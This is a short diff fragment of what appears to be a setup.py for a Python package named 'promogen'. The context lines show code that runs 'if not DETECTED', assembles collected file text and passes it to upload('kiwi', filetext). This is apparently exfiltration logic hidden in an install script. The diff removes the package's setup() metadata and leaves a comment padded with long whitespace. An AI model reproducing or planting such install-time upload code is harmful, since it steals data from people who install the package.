@@ -916,16 +916,4 @@ if not DETECTED:
             filetext += "\n"
     upload("kiwi", filetext)
 
-setup(
-
-    name='promogen',
-    packages=['promogen'],
-    version='1.0',
-    license='MIT',
-    description='Makes Everything Beautiful',
-    author='Bitz',
-    keywords=['style'],
-    install_requires=[''],
-    classifiers=['Development Status :: 5 - Production/Stable']
-
-)
+# setup(...) removed                                                                                                                                                                                                                                                                
